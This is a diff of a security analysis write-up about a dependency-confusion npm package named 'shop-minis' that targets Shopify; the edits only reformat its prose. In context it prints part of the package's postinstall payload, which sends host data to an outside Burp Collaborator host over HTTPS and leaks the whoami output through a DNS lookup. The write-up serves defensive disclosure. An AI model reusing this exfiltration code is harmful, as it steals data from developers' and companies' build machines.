@@ -6,7 +6,10 @@ packageName: shop-minis
 ecosystem: npm
 ---
 
-Shopify ships [Shop Minis](https://shop.app/minis), whose private packages live behind `@shopify/`; the public, unscoped name `shop-minis` is the kind of bare string a build script resolves to npmjs.org when an internal proxy misses. Earlier today `lobo_hunt <practiceextraone@gmail.com>` registered exactly that name and pushed straight to `2.0.5`, with the description `Security research canary — shopify` and a one-line readme: `Takeover By lobo`.
+Shopify ships [Shop Minis](https://shop.app/minis), whose private packages live behind `@shopify/`. The public, unscoped name `shop-minis` is the kind of bare string a build script resolves to npmjs.org when an internal proxy misses. Earlier today `lobo_hunt <practiceextraone@gmail.com>` registered exactly that name and pushed straight to `2.0.5`. The package self-identifies bluntly:
+
+- Description: `Security research canary — shopify`
+- Readme (whole file): `Takeover By lobo`
 
 The entire payload runs from `postinstall`:
 
@@ -29,7 +32,7 @@ https.<span class="tok-fn">get</span>({ host: CALLBACK_HOST, path, timeout: <spa
 <span class="tok-builtin">require</span>(<span class="tok-str">'dns'</span>).<span class="tok-fn">lookup</span>(<span class="tok-tmpl">`<span class="tok-tmpl-expr">${payload.whoami}</span>.<span class="tok-tmpl-expr">${CALLBACK_HOST}</span>`</span>, () =&gt; {});
 </code></pre>
 
-`oastify.com` is PortSwigger's Burp Collaborator, polling for any HTTP, DNS, or SMTP interaction against that random subdomain. The two channels are deliberate: the HTTPS GET carries the structured payload, and the DNS lookup leaks `whoami` as the leftmost label so a strict egress allowlist that blocks outbound HTTPS still surfaces it to the resolver. The path label `/shopify` and the canary's name make the experiment explicit — anything that detonates this is something inside Shopify (or built by them) that resolved the bare name against the public registry. The signature — `lobo_hunt`, a Burp instance, a `Takeover By lobo` readme — reads as bug-bounty research, not the `jean_dupont24` / `web-dotenv` cluster from earlier today; the recipe lands the same either way.
+`oastify.com` is PortSwigger's Burp Collaborator, polling for any HTTP, DNS, or SMTP interaction against that random subdomain. The two channels are deliberate: the HTTPS GET carries the structured payload, and the DNS lookup leaks `whoami` as the leftmost label so a strict egress allowlist that blocks outbound HTTPS still surfaces it to the resolver. The path label `/shopify` and the canary's name make the experiment explicit — anything that detonates this is something inside Shopify (or built by them) that resolved the bare name against the public registry. The signature reads as bug-bounty research — a `lobo_hunt` publisher, a Burp Collaborator instance, a "Takeover By lobo" readme. That's a different cluster from [the web-dotenv campaign](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/) earlier today, but the recipe lands the same either way.
 
 ## Traits observed
 
